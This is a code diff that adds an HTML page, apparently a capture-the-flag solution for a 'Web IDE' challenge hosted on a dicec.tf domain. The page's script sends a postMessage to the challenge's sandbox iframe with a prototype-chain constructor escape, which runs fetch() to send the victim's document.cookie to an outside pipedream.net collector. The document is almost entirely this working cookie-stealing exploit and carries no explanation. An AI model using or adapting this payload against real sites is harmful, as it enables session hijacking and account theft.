@@ -1,1 +1,20 @@
-<script>console.log(document.cookie);</script>
+
+<!doctype html>
+<html>
+  <head>
+    <title>Web IDE</title>
+    <script>document.getElementById('a').addEventListener('onload', () => {
+    document.querySelector('iframe')
+      .contentWindow
+      .postMessage(`[].__proto__.__proto__.constructor.constructor('return fetch("https://encnu1395lyv7.x.pipedream.net/?q="+document.cookie)')()`, '*');
+  });</script>
+  </head>
+  <body>
+    <div id="editor">
+      <iframe src="https://web-ide.dicec.tf/sandbox.html" frameborder="0" sandbox="allow-scripts allow-same-origin" id="a"></iframe>
+      <br />
+      <button id="run">Run Code</button>
+      <button id="save">Save Code (Admin Only)</button>
+    </div>
+  </body>
+</html>
